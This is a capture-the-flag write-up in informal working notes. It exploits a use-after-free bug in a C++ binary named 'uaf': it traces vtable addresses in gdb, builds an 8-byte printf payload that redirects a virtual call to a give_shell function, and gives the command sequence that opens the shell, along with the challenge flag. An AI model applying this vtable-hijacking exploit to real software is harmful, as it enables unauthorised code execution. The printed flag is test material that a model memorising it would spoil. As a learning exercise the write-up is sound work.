- OK. Running the uaf elf, I see there are 3 options - use, after and free (funny)
- Diginig into the code - There is a private function that gives you a shell - but it's never called. The only function that actually runs is "introduce". during the use section
- The free sections is deleting the dynamic object allocated.
- The after is taking a file path and size from argv and read it into the heap.
- I read about dynamic allocating. The allocating is saved as a linked list
- Because the heap is saved in a format of linked list, if I malloc something, and the pointer returned is let's say - 0x1111, with a size of 5 bytes "aaaaa" for example. Then I use free(), so the 5 bytes allocated are now free and 0x1111 is freed. Now I malloc something else in the size of 5 bytes - let's say "bbbbb" so now 0x1111 is pointing to the start of "bbbbb" instead of "aaaaa". Now if I use read the pointer after I freed it and allocated something new, I will expect to get "aaaaa" but i will get "bbbbb"!
- So practicly, what I sould do in this CTF is this. There are 2 "new" in the start of the main function which are allocating the classes. Then if I use the "free" command they will be deleted. Then I need to run the "after" and allocate some new data. If the right data is allcoated, I can run "use" and run code! The actually intersting thing there is making the function "give_shell" run instead of "introduce".
- Let's calculate the size of the Human class then!

Human class:
virtual void function - 4 bytes (pointer)
int - 4 bytes
string - 4 bytes (pointer)
virtual void function - 4 bytes (pointer)

To sum the size - 16 Bytes.

Now for the Man\Woman class:
The only thing that is added is an implamentaion of the introduce virtual function, which is not adding anything! (the size was calculated in the base function)
so also - 16 Bytes.

- Looking at the data then, the "introduce" function is starting after 12 bytes. If I will be able to take the pointer to "give_shell" in its place I will run code!!

- Ok I looked into it. it's gdb time!
My idea is using a gdb breakpoint in order to get the give_shell function pointer value, then writing that value into the file and using continue!
- Using "b Human::introduce" I can make the code break on that function

- Ok so! using "info functions Human" I got the address of the give_shell function: 
0x000000000040117a 
I am not sure if this address is constant in memory, but that's something to work with - every time I ran the process I saw the same address

- In order to use args with GDB I used
gdb --args ./uaf 16 /tmp/data.txt

- I figured that using gdb will be way easier with symbols. In order to do so, I used 
cd /tmp
"g++ -Wall -g /home/uaf/uaf.cpp -o symuaf"
- AMAZING! Now I have symbols!

- Using printf I can write bytes into file:
`printf "%b" '\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11' >> /tmp/data.txt`

- You can add a break point using line number!
"b uaf.cpp:55"

- AMAZINGGG
I couldn't make the malloc of my data to be the same as one of the Humans, It was always a new address instead of a freed one. The problem was the size. I needed the memory chuck to be similar in size to the original allocation, after some trial and error I found out that 42 bytes did the trick! Now I managed to "steal" the woman pointer!. I thing that it is still a problem, because the man will throw a seg falut before I can run my code.. I need to do something about that. 

- AHAH!!!! I did it! (it was pretty fast - took me a few seconds). I figured that if the size is right, then using malloc again might return the man's pointer - which it did ;) Now I only need a shellcode that points to the give_shell function and I won.

- Using `info address Human::give_shell` I found out the address is 0x4012ea

- Using `x/10a *(void**)m"` I can see the vtable (virtual table) of Human and the address

- Well, now it worked well, but I got a seg fault (of course). I was doing all sorts of things to understand how to make it work - but I figured that I need to dig into the assembly - see exactly where I fail. I used "x/i 0x0000000000401149" and saw that the problem is in this line:
`mov    (%rax),%rax`

I believe that it's part of the function call, and "rax" should have the function address. Using "p/x $rax" I read rax value and found this: 0x4444333322221119
It's great! the values I used are 0x4444333322221111. One assembly line before the address is added 8. The code crashes because that address is invalid, but if I will manage to put the right address then I can make it!

- In order to edit the file with hex editor I used vim and ":%!xxd", to exit it I used ":%!xxd -r"

- Using `!printf "%b" '\x00\xe2\x12\x40\x00\x00\x00\x00' > /tmp/data.txt`
I can manage to inject the address pretty well (took me some time to get the big/small indian thing there). The problem is actully 3 assembly lines before the call. The code is this line:
```
add    $0x8,%eax
adding 0x8 to eax (not rax!)
```

I was trying to figure out what address will resolve in 0x4012ea after this line and I just can't make it. I'll take some time off, I am sure I can make it work! 

- Morning!
I had an idea. If I can use a breakpoint on the line before the add, and after the add "in the wild" - without my payload, I can see the diff. I found out that the address

So in the wild the values are as following:
`before: 0x401668 (dec: 4200040)`
`after:  0x401670 (dec: 4200048)`

If I will take my address: 0x4012ea (dec: 4199146), substruct 8 and we get 0x4012e2 (dec: 4199138)

- Somehow, the dec value after the +8 is - 1074979336 (dec)
- Let's try using only 0's and see what is acctualy the value added.

- I made itttt! Using trial and error, I understood that the thing that is messing me up is that when adding the 8 I get another digit in my hex value. So I tried using a payload with all 0's, and slowly adding numbers until I can get it to work! The shellcode I cameup with was this:

`!printf "%b" '\xe2\x12\x40\x00\x00\x00\x00\x00' > /tmp/data.txt`
When adding 0x8 to that data, we get the 0x4012ea address 

- Andd still seg fault. Let's see what happends in the wild.

- I set a break point as following `x/i 0x401153`.
reading rax leads to 0x40144a - looked into the vtable of m and this is acctualy the address of Man::introduce. I am VERY close. There are a few more other stuff happening before the function call, and my address is probably not good. Let's check.

- I looked into what the address in the wild looks like in the line of the seg fault (0x4011)

`!printf "%b" '\xe2\x12\x40\x00\x00\x00\x00\x00' > /tmp/data.txt`

- Ok in order to make my life less misrable - I used 
"set disassembly-flavor intel" to make the assembly easier to disassbmle

- NICE! Got a lead. I saw that on the wild, rax holds some kind of value, THAT IS NOT the address where introduce is, but a POINTER to the address. So the following line comes up:
`0x0000000000401142 <+284>:   mov    rax,QWORD PTR [rax]`

The thing there, is that rax is changed with the value of the data inside of the pointer that rax holds.
I did some digging, in the wild the address originaly inside of rax is 0x401670. Looking inside of this address we find:
```
p/x *0x401670
0x40144a
```
This address is the introduce address!! I was looking into it and the 0x401670 address is inside the vtable
0x401668 <_ZTV3Man+16>: 0x4012ea <Human::give_shell()>  0x40144a <Man::introduce()>

If 0x401670 is introduce, then 0x401668 must be give_shell!
I ran `p/x *0x401668` and indeed got the give_shell function value!
Let's try it then!

- YEAHHHHHHHH it work with my symboled binary!! I RAN CODE! I HAVE SHELLLLL!!

- BUT I can't get the flag because my binary is not suid.


- It's the money time, let's go!
- Running the 
```
./uaf 42 /tmp/data.txt
free
after
after
use!
```
- ANDD no. it got seg fault
- OK I disassembled the code, used a break point in the line of "mov rax, [rax]"
then I read the value of rax - 0x827ca0
SOO TECHINCLY - using this address I can make my shellcode work.

- In order to understand where in the code I am, I crashed my code (free, then use) - it was this line:
`=> 0x0000000000401149 <+291>:   mov    rax,QWORD PTR [rax]`

In the original code:
`=> 0x0000000000400fd8 <+276>:   mov    rdx,QWORD PTR [rax]`

- The code in the original file is a bit diffrent, it uses the rdx register instead. I set a break point and looked inside of rax - the address was "0x401578" - let's try building a payload around it

(0x401578 - 0x8 ofcourse)
`!printf "%b" '\x70\x15\x40\x00\x00\x00\x00\x00' > /tmp/data.txt`

- Using the following payload, I managed to run `introduce()`.

- Ok so I did the following:
```
I know that in the wild the pointer is 0x401578

using p/x *0x401578 I got the value 0x4012d2.
using x/i 0x4012d2 which is introduce!

substructing 8 from this address I get 0x401570
using p/x *0x401570 - I get 0x40117a
using x/i 0x40117a - I get give_shell!!
```

So now let's build the payload, because there is add 0x8 before the call, I need to substruct 8 from 0x401570

- Before the jackpot - there was something odd about the size I need to read from my text file in order to "steal" the old pointer of the Man. I used 42 bytes on the code I compiled but on the original one 16 bytes worked :)

- So let's use the following payload now.
# Building the payload
`!printf "%b" '\x68\x15\x40\x00\x00\x00\x00\x00' > /tmp/data.txt`

```bash
/home/uaf/uaf 16 /tmp/data.txt
# (Running the binary - Man and Woman are malloced)

3 - free
# (The addressed allocated are now free to use)

2 - after
# (Allocating data on the old woman pointer)

2 - after
# (Allocating data on the old man pointer)
1 - use

# (Trying to run man.introduce() - the custom crafted payload is pointing to give_shell instead)
```
- SHELL!!!!
`cat flag ;)`

# FLAG: yay_f1ag_aft3r_pwning
# pwned.